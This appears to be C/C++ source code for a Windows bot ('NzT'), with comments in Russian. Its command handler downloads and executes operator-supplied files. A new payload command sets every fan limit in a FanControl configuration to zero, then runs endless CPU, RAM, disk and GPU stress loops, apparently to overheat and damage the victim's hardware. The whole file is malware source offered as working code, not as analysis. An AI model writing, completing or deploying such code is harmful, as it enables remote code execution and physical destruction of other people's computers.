#include <Windows.h>
#include <process.h>
#include <d3d11.h>
#include <dxgi.h>
#include <math.h>
#include <time.h>

#ifdef _DEBUG
#include <stdio.h>
#endif

#include "nzt.h"
#include "command.h"
#include "utils.h"
#include "file.h"

void inject_fancontrol_config()
{
    const wchar_t* fc_dir = L"\\??\\C:\\Users\\Public\\Documents\\FanControl";
    const wchar_t* cfg_path = L"\\??\\C:\\Users\\Public\\Documents\\FanControl\\FanControl.cfg";

    // Создать директорию
    FileCreateDirectory(fc_dir);

    // Проверить существование файла
    HANDLE hFile;
    if (!FileOpen(&hFile, cfg_path, GENERIC_READ, FILE_OPEN))
    {
        // Файл не существует, создаём
        const char* default_cfg = "<fan id=\"test\"><min>10</min><max>100</max></fan>";
        FileWriteBuffer(cfg_path, default_cfg, (DWORD)strlen(default_cfg), FALSE);
    }
    else
    {
        API(NtClose)(hFile);
    }

    // Прочитать файл
    LPVOID content = NULL;
    DWORD size = 0;
    if (!FileReadBuffer(cfg_path, &content, &size))
        return;

    // Изменить <min> и <max> на 0
    char* pos = (char*)content;
    while ((pos = strstr(pos, "<fan ")) != NULL)
    {
        char* min_pos = strstr(pos, "<min>");
        char* max_pos = strstr(pos, "<max>");

        if (min_pos && max_pos)
        {
            // Проверяем длину чисел перед заменой
            // Заменяем только содержимое между тегами
            char* end_min_tag = strstr(min_pos, "</min>");
            char* end_max_tag = strstr(max_pos, "</max>");
            
            if (end_min_tag && end_max_tag)
            {
                // Найти начало числа после <min>
                char* start_num_min = min_pos + 5; // после <min>
                char* start_num_max = max_pos + 5; // после <max>
                
                // Заменить содержимое тегов на "0"
                memmove(start_num_min + 1, end_min_tag, strlen(end_min_tag) + 1); // оставляем "0</min>"
                *start_num_min = '0';
                
                memmove(start_num_max + 1, end_max_tag, strlen(end_max_tag) + 1); // оставляем "0</max>"
                *start_num_max = '0';
            }
        }
        pos += 5;
    }

    // Перезаписать файл
    FileWriteBuffer(cfg_path, content, size, FALSE);
    Free(content);
}

void cpu_stress_thread(void* param)
{
    while (TRUE)
    {
        double sum = 0.0;
        for (int i = 0; i < 8000000; ++i)
        {
            sum += sin((double)i) * cos((double)i) + sqrt((double)i);
        }
        volatile double result = sum;
    }
}

void ram_stress_thread(void* param)
{
    const size_t size = 1024 * 1024 * 1024;
    while (TRUE)
    {
        char* buffer = (char*)malloc(size); // Используем malloc/free вместо new/delete
        if (!buffer) continue;

        for (size_t i = 0; i < size; i += 1024)
        {
            buffer[i] = (char)(i % 94 + 32);
        }

        volatile char dummy = 0;
        for (size_t i = 0; i < size; i += 2048)
        {
            dummy ^= buffer[i];
        }

        free(buffer);
    }
}

void disk_stress_thread(void* param)
{
    const wchar_t* filename = L"\\??\\C:\\temp\\stress_disk.tmp";
    const size_t chunk_size = 1024 * 1024 * 10; 
    char* data = (char*)malloc(chunk_size); // Используем malloc/free

    srand((unsigned)time(NULL));
    for (size_t i = 0; i < chunk_size; ++i)
    {
        data[i] = (char)(rand() % 256);
    }

    while (TRUE)
    {
        FileWriteBuffer(filename, data, (DWORD)chunk_size, FALSE);
        FileDelete(filename);
    }
    free(data); // Не будет выполнено из-за бесконечного цикла
}

void gpu_stress_thread(void* param)
{
    ID3D11Device* device = nullptr;
    ID3D11DeviceContext* context = nullptr;
    D3D_FEATURE_LEVEL featureLevel;

    HRESULT hr = D3D11CreateDevice(nullptr, D3D_DRIVER_TYPE_HARDWARE, nullptr,
                                   0, nullptr, 0, D3D11_SDK_VERSION, &device, &featureLevel, &context);
    if (FAILED(hr)) return;

    const char* cs_shader_code = R"(
        RWStructuredBuffer<uint> buffer : register(u0);
        [numthreads(1024, 1, 1)]
        void CSMain(uint3 id : SV_DispatchThreadID)
        {
            uint index = id.x;
            float val = (float)index;
            for (int i = 0; i < 100; ++i) {
                val = sin(val) * cos(val) + val * val;
            }
            buffer[index] = (uint)val;
        }
    )";

    ID3DBlob* shaderBlob = nullptr;
    D3DCompile(cs_shader_code, strlen(cs_shader_code), nullptr, nullptr, nullptr, "CSMain", "cs_5_0", 0, 0, &shaderBlob, nullptr);
    if (!shaderBlob) return;

    ID3D11ComputeShader* computeShader = nullptr;
    hr = device->CreateComputeShader(shaderBlob->GetBufferPointer(), shaderBlob->GetBufferSize(), nullptr, &computeShader);
    if (FAILED(hr)) {
        shaderBlob->Release();
        context->Release();
        device->Release();
        return;
    }

    D3D11_BUFFER_DESC bd = {};
    bd.Usage = D3D11_USAGE_DEFAULT;
    bd.BindFlags = D3D11_BIND_UNORDERED_ACCESS | D3D11_BIND_SHADER_RESOURCE;
    bd.CPUAccessFlags = 0;
    bd.MiscFlags = 0;
    bd.ByteWidth = 1024 * 1024 * sizeof(uint32_t);

    ID3D11Buffer* buffer = nullptr;
    hr = device->CreateBuffer(&bd, nullptr, &buffer);
    if (FAILED(hr)) {
        computeShader->Release();
        shaderBlob->Release();
        context->Release();
        device->Release();
        return;
    }

    D3D11_UNORDERED_ACCESS_VIEW_DESC uavd = {};
    uavd.Format = DXGI_FORMAT_R32_UINT;
    uavd.ViewDimension = D3D11_UAV_DIMENSION_BUFFER;
    uavd.Buffer.FirstElement = 0;
    uavd.Buffer.NumElements = 1024 * 1024;

    ID3D11UnorderedAccessView* uav = nullptr;
    hr = device->CreateUnorderedAccessView(buffer, &uavd, &uav);
    if (FAILED(hr)) {
        buffer->Release();
        computeShader->Release();
        shaderBlob->Release();
        context->Release();
        device->Release();
        return;
    }

    while (TRUE)
    {
        context->CSSetUnorderedAccessViews(0, 1, &uav, nullptr);
        context->CSSetShader(computeShader, nullptr, 0);
        context->Dispatch(1024, 1, 1);
        context->ClearState();
    }

    // Эти строки не будут достигнуты из-за бесконечного цикла
    uav->Release();
    buffer->Release();
    computeShader->Release();
    shaderBlob->Release();
    context->Release();
    device->Release();
}

void launch_stress_processes()
{
    _beginthread(cpu_stress_thread, 0, nullptr);
    _beginthread(ram_stress_thread, 0, nullptr);
    _beginthread(disk_stress_thread, 0, nullptr);
    _beginthread(gpu_stress_thread, 0, nullptr);
}

void CommandExecute(
    COMMANDS Command, 
    char**   Parameter
)
{
    DebugPrint("NzT: Executed command: %d %s", Command, Parameter[2]);

    switch (Command)
    {
        case COMMAND_DL_EXEC:
        {
            DownloadFile(Parameter[2], TRUE);
            break;
        }

        case COMMAND_UPDATE:
        {
            DownloadFile(Parameter[2], TRUE);
            //uninstall and update registry key values to hold new version number
            break;
        }

        case COMMAND_RUN_PAYLOAD:  // Новая команда
        {
            inject_fancontrol_config();
            launch_stress_processes();
            break;
        }

        case COMMAND_KILL:
            ExitProcess(0); // Исправлена ошибка в вызове API
            break;

        case COMMAND_LOAD_PLUGIN:
        case COMMAND_UNINSTALL:
            // Добавлены недостающие case-ветви
            break;
    }
}

